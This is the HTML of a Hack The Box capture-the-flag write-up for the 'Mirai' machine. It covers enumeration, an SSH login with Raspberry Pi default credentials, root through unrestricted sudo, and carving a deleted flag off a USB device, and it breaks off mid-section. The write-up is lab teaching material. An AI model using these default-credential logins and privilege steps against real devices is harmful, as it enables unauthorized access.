@@ -1,0 +1,373 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Mirai" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a DNS enumeration, revealing a domain name raspberrypi.local, suggestings that our target could be running raspberry pi OS. After some web enumeration, there is a pi-hole running on port 80 and Plex Media Server running on port 43400, but both are rabbit-holes. Simply SSH w/ raspberry pi OS’s default credentials pi:raspberrypi, allowing us to obtain a low-privilege/pi user." /><meta property="og:description" content="Overview This machine begins w/ a DNS enumeration, revealing a domain name raspberrypi.local, suggestings that our target could be running raspberry pi OS. After some web enumeration, there is a pi-hole running on port 80 and Plex Media Server running on port 43400, but both are rabbit-holes. Simply SSH w/ raspberry pi OS’s default credentials pi:raspberrypi, allowing us to obtain a low-privilege/pi user." /><link rel="canonical" href="https://yufongg.github.io/posts/Mirai/" /><meta property="og:url" content="https://yufongg.github.io/posts/Mirai/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-17T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Mirai" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-09-17T00:00:00+08:00","description":"Overview This machine begins w/ a DNS enumeration, revealing a domain name raspberrypi.local, suggestings that our target could be running raspberry pi OS. After some web enumeration, there is a pi-hole running on port 80 and Plex Media Server running on port 43400, but both are rabbit-holes. Simply SSH w/ raspberry pi OS’s default credentials pi:raspberrypi, allowing us to obtain a low-privilege/pi user.","headline":"HackTheBox - Mirai","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Mirai/"},"url":"https://yufongg.github.io/posts/Mirai/"}</script><title>HackTheBox - Mirai | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Mirai</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Mirai/images/Pasted%20image%2020220919015206.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Mirai</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1663344000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-17 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1615 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a DNS enumeration, revealing a domain name <code class="language-plaintext highlighter-rouge">raspberrypi.local</code>, suggestings that our target could be running <code class="language-plaintext highlighter-rouge">raspberry pi OS</code>. After some web enumeration, there is a <code class="language-plaintext highlighter-rouge">pi-hole</code> running on port 80 and <code class="language-plaintext highlighter-rouge">Plex Media Server</code> running on port 43400, but both are rabbit-holes. Simply SSH w/ <code class="language-plaintext highlighter-rouge">raspberry pi OS</code>’s default credentials <code class="language-plaintext highlighter-rouge">pi:raspberrypi</code>, allowing us to obtain a low-privilege/<code class="language-plaintext highlighter-rouge">pi</code> user.</p><p>For privilege escalation, user <code class="language-plaintext highlighter-rouge">pi</code> is able to run any commands as root, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code> w/ <code class="language-plaintext highlighter-rouge">su</code>. However, there are additional steps to do to obtain <code class="language-plaintext highlighter-rouge">root.txt</code>, <code class="language-plaintext highlighter-rouge">root.txt</code> is stored in removable drive <code class="language-plaintext highlighter-rouge">/dev/sdb</code>, upon finding that removable drive, <code class="language-plaintext highlighter-rouge">root.txt</code> is deleted. After analyzing the removable drive w/ <code class="language-plaintext highlighter-rouge">strings</code> &amp; <code class="language-plaintext highlighter-rouge">xxd</code>, the contents of <code class="language-plaintext highlighter-rouge">root.txt</code> is stored in its memory.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Mirai<tr><td>IP<td>10.10.10.48<tr><td>Points<td>20<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/2904">Arrexel</a><tr><td>Release Date<td>01 Sep 2017</table></div><h1 id="recon">Recon</h1><h2 id="tcp5353">TCP/5353 <a href="#tcp5353" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Zone Transfer<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/mirai]
+  └─# dig -x 10.10.10.48 @mirai.htb -p 5353
+	
+  ; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; -x 10.10.10.48 @mirai.htb -p 5353
+  ;; global options: +cmd
+  ;; Got answer:
+  ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9514
+  ;; flags: qr aa; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+	
+  ;; QUESTION SECTION:
+  ;48.10.10.10.in-addr.arpa.      IN      PTR
+	
+  ;; ANSWER SECTION:
+  48.10.10.10.in-addr.arpa. 10    IN      PTR     raspberrypi.local.
+	
+  ;; Query time: 39 msec
+  ;; SERVER: 10.10.10.48#5353(mirai.htb) (UDP)
+  ;; WHEN: Fri Sep 16 03:27:56 +08 2022
+  ;; MSG SIZE  rcvd: 73
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">raspberrypi.local</code></ul></ul><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/mirai]
+  └─# ffuf -u http://raspberrypi.local/FUZZ -w /usr/share/wordlists/dirb/common.txt  -fw 400,2
+	
+  admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
+  swfobject.js            [Status: 200, Size: 61, Words: 10, Lines: 2]
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin</code><li><code class="language-plaintext highlighter-rouge">swfobject.js</code></ul></ul><h2 id="tcp43400-http">TCP/43400 (HTTP) <a href="#tcp43400-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+  └─# ffuf -u http://10.10.10.48:32400/FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 2,5
+	
+  crossdomain.xml         [Status: 200, Size: 347, Words: 16, Lines: 7]
+  favicon.ico             [Status: 200, Size: 5430, Words: 25, Lines: 14]
+  identity                [Status: 200, Size: 175, Words: 6, Lines: 4]
+  manage                  [Status: 301, Size: 0, Words: 1, Lines: 1]
+  web                     [Status: 301, Size: 0, Words: 1, Lines: 1]
+  :: Progress: [4615/4615] :: Job [1/1] :: 1037 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+</pre></table></code></div></div></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---pi-hole-v314">TCP/80 (HTTP) - Pi-Hole v3.1.4 <a href="#tcp80-http---pi-hole-v314" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found <code class="language-plaintext highlighter-rouge">pi-hole v3.1.4</code> login page<li><p>Search exploits for <code class="language-plaintext highlighter-rouge">pi-hole v3.1.4</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Pi-hole &lt; 4.4 - Authenticated Remote Code Execution<td>linux/webapps/48442.py<tr><td>Pi-hole &lt; 4.4 - Authenticated Remote Code Execution / Privileges Escalation<td>linux/webapps/48443.py</table></div><li>We must be authenticated first.<li>I tried to further enumerate the web directory for files that contain credentials, failed.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+ └─# ffuf -u http://10.10.10.48/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.txt' -fw 1,0,5
+</pre></table></code></div></div></ol><h2 id="tcp43400-http---plex-media-server">TCP/43400 (HTTP) - Plex Media Server <a href="#tcp43400-http---plex-media-server" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found <code class="language-plaintext highlighter-rouge">Plex Media Server</code> login page, version unknown<li><p>Search exploits for <code class="language-plaintext highlighter-rouge">Plex Media Server</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Plex Media Server 0.9.9.2.374-aa23a69 - Multiple Vulnerabilities<td>multiple/webapps/31983.txt</table></div><li>Tried some of the POC, did not work.</ol><h2 id="tcp22-ssh---default-credentials">TCP/22 (SSH) - Default Credentials <a href="#tcp22-ssh---default-credentials" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Earlier, we enumerated a domain name, <code class="language-plaintext highlighter-rouge">raspberrypi.local</code>, is a hint that the target could be running <code class="language-plaintext highlighter-rouge">raspberry pi OS</code>.<li>By default, <code class="language-plaintext highlighter-rouge">raspberry pi</code> login details are <code class="language-plaintext highlighter-rouge">pi:raspberry</code><li>SSH w/ <code class="language-plaintext highlighter-rouge">pi:raspberry</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai]
+ └─# sshpass -p "raspberry" ssh pi@raspberrypi.local 
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Mirai/images/Pasted%20image%2020220916214421.png" alt="" data-proofer-ignore></p></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---via-sudo">Root - Via SUDO <a href="#root---via-sudo" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check sudo access for user <code class="language-plaintext highlighter-rouge">pi</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> pi@raspberrypi:~ $ sudo -l
+ Matching Defaults entries for pi on localhost:
+     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+	
+ User pi may run the following commands on localhost:
+     (ALL : ALL) ALL
+     (ALL) NOPASSWD: ALL
+</pre></table></code></div></div><ul><li>Able to run all commands as root</ul><li>Privilege escalate w/ <code class="language-plaintext highlighter-rouge">su</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> pi@raspberrypi:~ $ sudo su
+ root@raspberrypi:/home/pi# id;whoami
+ uid=0(root) gid=0(root) groups=0(root)
+ root
+</pre></table></code></div></div></ol><h2 id="where-is-roottxt">Where is Root.txt? <a href="#where-is-roottxt" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View contents of <code class="language-plaintext highlighter-rouge">root.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> root@raspberrypi:~# cat root.txt 
+ I lost my original root.txt! I think I may have a backup on my USB stick...
+</pre></table></code></div></div><li>Enumerate <code class="language-plaintext highlighter-rouge">mounts</code> in system<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre> root@raspberrypi:~# cat /etc/fstab
+ # UNCONFIGURED FSTAB FOR BASE SYSTEM
+ aufs / aufs rw 0 0
+ tmpfs /tmp tmpfs nosuid,nodev 0 0
+ /dev/sdb /media/usbstick ext4 ro,suid,dev,noexec,auto,user,async 0 0
+	
+ root@raspberrypi:~# mount | grep stick
+ /dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
+	
+ root@raspberrypi:~# df -h | grep stick
+ /dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/dev/sdb usbstick</code> - <code class="language-plaintext highlighter-rouge">ext4</code></ul><li>View files in <code class="language-plaintext highlighter-rouge">/media/usbstick</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre> root@raspberrypi:/media/usbstick# ls -la
+ total 18
+ drwxr-xr-x 3 root root  1024 Aug 14  2017 .
+ drwxr-xr-x 8 root root  4096 Sep 16 12:52 ..
+ -rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
+ drwx------ 2 root root 12288 Aug 14  2017 lost+found
+ root@raspberrypi:/media/usbstick# cat damnit.txt 
+ Damnit! Sorry man I accidentally deleted your files off the USB stick.
+ Do you know if there is any way to get them back?
+	
+ -James
+</pre></table></code></div></div></ol><h2 id="recovering-roottxt">Recovering Root.txt <a href="#recovering-roottxt" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View <code class="language-plaintext highlighter-rouge">/dev/sdb</code> w/ <code class="language-plaintext highlighter-rouge">xxd</code> a hexeditor<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/media# xxd "/dev/sdb" | grep -v "0000 0000 0000 0000 0000 0000 0000 0000"
+</pre></table></code></div></div><li>Found contents <code class="language-plaintext highlighter-rouge">root.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> root@raspberrypi:/media# xxd "/dev/sdb" | grep -P "[a-z0-9]{16}" | grep -P "[a-z0-9]{16}" | awk '{print $NF}' | sed -z 's/\n//g'
+ 3d3e483143ff12ec505d026fa13e020
+</pre></table></code></div></div><li>View <code class="language-plaintext highlighter-rouge">/dev/sdb</code> w/ <code class="language-plaintext highlighter-rouge">strings</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> root@raspberrypi:/media# strings "/dev/sdb" |  grep -P "[a-z0-9]{32}"
+ 3d3e483143ff12ec505d026fa13e020b
+</pre></table></code></div></div></ol><h2 id="recovering-roottxt-w-testdisk---failed">Recovering Root.txt w/ testdisk - Failed <a href="#recovering-roottxt-w-testdisk---failed" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Recover the deleted file w/ <code class="language-plaintext highlighter-rouge">testdisk</code><ul><li><code class="language-plaintext highlighter-rouge">testdisk</code> - is a free and open-source data recovery utility that helps users recover lost partitions or repair corrupted filesystems.</ul><li>Install <code class="language-plaintext highlighter-rouge">testdisk</code> on <code class="language-plaintext highlighter-rouge">mirai.htb</code><ol><li>Download <a href="https://www.cgsecurity.org/testdisk-7.2-WIP.linux26.tar.bz2"><code class="language-plaintext highlighter-rouge">testdisk</code></a><li>Transfer to <code class="language-plaintext highlighter-rouge">mirai.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk# wget 10.10.14.14:9090/testdisk-7.2-WIP.linux26.tar.bz2
+</pre></table></code></div></div><li>Unzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk# tar -xf testdisk-7.2-WIP.linux26.tar.bz2 
+</pre></table></code></div></div><li>Copy <code class="language-plaintext highlighter-rouge">testdisk_static</code> into <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# cp testdisk_static /usr/local/sbin/testdisk
+</pre></table></code></div></div><li>Make <code class="language-plaintext highlighter-rouge">testdisk</code> executable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# chmod +x /usr/local/sbin/testdisk
+</pre></table></code></div></div></ol><li>Attempt to recover the deleted file w/ <code class="language-plaintext highlighter-rouge">testdisk</code><ol><li>Execute <code class="language-plaintext highlighter-rouge">testdisk</code>,<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# sudo testdisk
+
+ # Use arrow keys to navigate
+ # Enter to select
+</pre></table></code></div></div><li>Create a new log file<li>Select <code class="language-plaintext highlighter-rouge">/dev/sdb</code><li>Select <code class="language-plaintext highlighter-rouge">None</code><li>Select <code class="language-plaintext highlighter-rouge">ext4</code>, <code class="language-plaintext highlighter-rouge">LIST</code><li>Copy <code class="language-plaintext highlighter-rouge">root.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> # Navigate to root 'c' to copy
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Mirai/images/Pasted%20image%2020220916232703.png" alt="" data-proofer-ignore></p><li>Move to <code class="language-plaintext highlighter-rouge">/tmp</code> to paste w/ <code class="language-plaintext highlighter-rouge">SHIFT+C</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Mirai/images/Pasted%20image%2020220916233101.png" alt="" data-proofer-ignore><li>View <code class="language-plaintext highlighter-rouge">root.txt</code> - empty<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp# cat root.txt 
+ root@raspberrypi:/tmp# wc -c root.txt 
+ 0 root.txt
+</pre></table></code></div></div></ol></ol><h2 id="recovering-roottxt-w-photorec---failed">Recovering Root.txt w/ photorec - Failed <a href="#recovering-roottxt-w-photorec---failed" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Recover the deleted file w/ <code class="language-plaintext highlighter-rouge">photorec</code><ul><li><code class="language-plaintext highlighter-rouge">photorec</code> - is a free and open-source utility software for data recovery with text-based user interface using data carving techniques, designed to recover lost files from various digital camera memory, hard disk and CD-ROM.</ul><li>Install <code class="language-plaintext highlighter-rouge">photorec</code> on <code class="language-plaintext highlighter-rouge">mirai.htb</code><ol><li>Download <a href="https://www.cgsecurity.org/testdisk-7.2-WIP.linux26.tar.bz2"><code class="language-plaintext highlighter-rouge">testdisk</code></a><li>Transfer to <code class="language-plaintext highlighter-rouge">mirai.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk# wget 10.10.14.14:9090/testdisk-7.2-WIP.linux26.tar.bz2
+</pre></table></code></div></div><li>Unzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
